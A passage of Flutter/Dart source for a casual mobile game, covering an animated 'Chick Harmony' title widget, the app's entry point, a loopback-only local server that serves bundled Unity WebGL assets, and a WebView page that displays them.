  void dispose() {
    _candyController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final TextStyle baseStyle = Theme.of(context).textTheme.displayMedium?.copyWith(
      fontSize: 44,
      fontWeight: FontWeight.w900,
      letterSpacing: 3,
      color: Colors.white,
    ) ??
        const TextStyle(
          fontSize: 44,
          fontWeight: FontWeight.w900,
          letterSpacing: 3,
          color: Colors.white,
        );

    return AnimatedBuilder(
      animation: _candyController,
      builder: (_, __) {
        final double phase = _candyController.value * 2 * math.pi;
        final double chickScale = 0.88 + 0.2 * (0.5 + 0.5 * math.sin(phase));
        final double harmonyScale = 0.88 + 0.2 * (0.5 + 0.5 * math.sin(phase + math.pi / 1.6));
        final double chickShadow = 6 + 6 * (0.5 + 0.5 * math.sin(phase));
        final double harmonyShadow = 6 + 6 * (0.5 + 0.5 * math.sin(phase + math.pi / 1.6));

        Widget buildBubbleWord(String text, double scale, List<Color> colors, double glow) {
          return Transform.scale(
            scale: scale,
            child: Stack(
              alignment: Alignment.center,
              children: [
                Text(
                  text,
                  style: baseStyle.copyWith(
                    foreground: Paint()
                      ..style = PaintingStyle.stroke
                      ..strokeWidth = 6
                      ..color = Colors.black.withOpacity(0.35),
                  ),
                ),
                ShaderMask(
                  shaderCallback: (Rect bounds) => LinearGradient(
                    colors: colors,
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ).createShader(bounds),
                  child: Text(
                    text,
                    style: baseStyle.copyWith(
                      shadows: [
                        Shadow(color: Colors.black.withOpacity(0.25), blurRadius: 4, offset: const Offset(0, 2)),
                        Shadow(color: Colors.white.withOpacity(0.5), blurRadius: glow, offset: Offset.zero),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          );
        }

        return Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            buildBubbleWord(
              "Chick",
              chickScale,
              const [Color(0xFFFFE066), Color(0xFFFFB347), Color(0xFFFF6F91)],
              chickShadow,
            ),
            SizedBox(width: widget.wordSpacing),
            buildBubbleWord(
              "Harmony",
              harmonyScale,
              const [Color(0xFF9ADCFF), Color(0xFFA9F1DF), Color(0xFFF2C6DE)],
              harmonyShadow,
            ),
          ],
        );
      },
    );
  }
}

// ============================================================================
// main()
// ============================================================================
void main() => matchTrioMain();

Future<void> matchTrioMain() async {
  WidgetsFlutterBinding.ensureInitialized();

  runApp(
    p.MultiProvider(
      providers: [
        matchTrioConsigliereProvider,
      ],
      child: r.ProviderScope(
        child: MaterialApp(
          debugShowCheckedModeBanner: false,
          home: const MatchTrioVestibule(),
        ),
      ),
    ),
  );
}



Future<UnityAssetServer> _startUnityServer({required int port}) async {
  final manifestJson = await rootBundle.loadString('AssetManifest.json');
  final manifest = Map<String, dynamic>.from(json.decode(manifestJson));
  final availableAssets = manifest.keys.toSet();

  final server = await HttpServer.bind(InternetAddress.loopbackIPv4, port);
  debugPrint('Unity asset server listening on http://localhost:$port');

  server.listen((HttpRequest request) async {
    final originalPath =
    request.uri.path == '/' ? '/unity/index.html' : request.uri.path;
    final decodedPath = Uri.decodeComponent(originalPath);

    final assetCandidates = <String>[
      'assets$decodedPath',
      if (decodedPath.endsWith('.data'))
        'assets${decodedPath}.unityweb',
      if (decodedPath.endsWith('.wasm'))
        'assets${decodedPath}.unityweb',
      if (decodedPath.endsWith('.js'))
        'assets${decodedPath}.unityweb',
    ];

    ByteData? byteData;
    String? hitPath;

    for (final candidate in assetCandidates) {
      if (availableAssets.contains(candidate)) {
        hitPath = candidate;
        byteData = await rootBundle.load(candidate);
        break;
      }
    }

    if (byteData == null) {
      debugPrint('404 -> $decodedPath (candidates: $assetCandidates)');
      request.response.statusCode = HttpStatus.notFound;
      request.response.write('Not found: $decodedPath');
      await request.response.close();
      return;
    }

    final headers = request.response.headers;
    headers.set(HttpHeaders.cacheControlHeader, 'public, max-age=31536000');

    void addEncoding(String encoding) {
      headers.add(HttpHeaders.contentEncodingHeader, encoding);
    }

    if (hitPath!.endsWith('.html')) {
      headers.contentType = ContentType.html;
    } else if (hitPath.endsWith('.js') || hitPath.endsWith('.js.unityweb')) {
      headers.contentType =
          ContentType('application', 'javascript', charset: 'utf-8');
    } else if (hitPath.endsWith('.css')) {
      headers.contentType = ContentType('text', 'css', charset: 'utf-8');
    } else if (hitPath.endsWith('.wasm') || hitPath.endsWith('.wasm.unityweb')) {
      headers.contentType = ContentType('application', 'wasm');
    } else if (hitPath.endsWith('.data') || hitPath.endsWith('.data.unityweb')) {
      headers.contentType = ContentType('application', 'octet-stream');
    } else {
      headers.contentType = ContentType.binary;
    }

    if (hitPath.endsWith('.unityweb')) {
      addEncoding('gzip'); // или 'br', если билд в Brotli
    }

    debugPrint('200 <- $decodedPath (served: $hitPath)');
    request.response.add(byteData.buffer.asUint8List());
    await request.response.close();
  });

  return UnityAssetServer(server);
}



class UnityWebGLApp extends StatelessWidget {
  const UnityWebGLApp({super.key, required this.server});
  final UnityAssetServer server;

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Unity WebGL (assets)',
      theme: ThemeData(useMaterial3: true, colorSchemeSeed: Colors.indigo),
      home: UnityWebGLPage(server: server),
    );
  }
}

class UnityWebGLPage extends StatefulWidget {
  const UnityWebGLPage({super.key, required this.server});
  final UnityAssetServer server;

  @override
  State<UnityWebGLPage> createState() => _UnityWebGLPageState();
}

class _UnityWebGLPageState extends State<UnityWebGLPage> {
  InAppWebViewController? controller;
  double progress = 0;

  @override
  void dispose() {
    widget.server.stop();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final unityUrl =
    WebUri('http://localhost:${widget.server.port}/unity/index.html');

    return Scaffold(

      body: InAppWebView(
        initialUrlRequest: URLRequest(url: unityUrl),
        initialSettings: InAppWebViewSettings(
          javaScriptEnabled: true,
          mediaPlaybackRequiresUserGesture: false,
          useHybridComposition: true,
        ),
        onWebViewCreated: (ctrl) => controller = ctrl,
        onProgressChanged: (_, value) =>
            setState(() => progress = value / 100),
        onConsoleMessage: (_, msg) => debugPrint('WebView console: $msg'),
        onLoadError: (_, url, code, msg) =>
            debugPrint('Load error [$code] $msg for $url'),
      ),
    );
  }
}


